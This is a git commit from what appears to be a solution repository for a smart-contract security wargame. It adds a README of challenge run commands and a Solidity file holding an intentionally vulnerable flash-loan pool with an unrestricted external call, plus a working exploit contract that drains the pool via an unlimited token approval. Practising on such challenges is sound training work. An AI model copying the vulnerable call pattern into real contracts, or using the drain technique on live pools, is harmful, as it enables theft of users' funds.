43292568d829103e748d8f3834a02ce2588948b1
sathya <leosathya10@gmail.com>
2022-06-24 01:52:25 +0530

    final Commit

---
+++ README.md
@@ -0,0 +1,47 @@
+# Challenge #1 - Unstoppable
+
+```bash
+  npm run unstoppable
+```
+
+# Challenge #2 - Naive receiver
+
+```bash
+  npm run naive-receiver
+```
+
+# Challenge #3 - Truster
+
+```bash
+  npm run truster
+```
+
+# Challenge #4 - Side Entrance
+
+```bash
+  npm run side-entrance
+```
+
+# Challenge #5 - The rewarder
+
+```bash
+  npm run the-rewarder
+```
+
+# Challenge #6 - Selfie
+
+```bash
+  npm run selfie
+```
+
+# Challenge #7 - Compromised
+
+```bash
+  npm run compromised
+```
+
+# Challenge #8 - Puppet
+
+```bash
+  npm run puppet
+```
---
+++ contracts/truster/TrusterLenderPool.sol
@@ -0,0 +1,49 @@
+pragma solidity ^0.6.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract TrusterLenderPool is ReentrancyGuard {
+
+    IERC20 public damnValuableToken;
+
+    constructor (address tokenAddress) public {
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function flashLoan(
+        uint256 borrowAmount,
+        address borrower,
+        address target,
+        bytes calldata data
+    )
+        external
+        nonReentrant
+    {
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+
+        damnValuableToken.transfer(borrower, borrowAmount);
+        (bool success, ) = target.call(data);
+        require(success, "External call failed");
+
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+    }
+
+}
+
+contract TrusterExploit {
+    function attack ( address _pool, address _token) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)", address(this), uint(-1)
+        );
+
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
+    }
+}
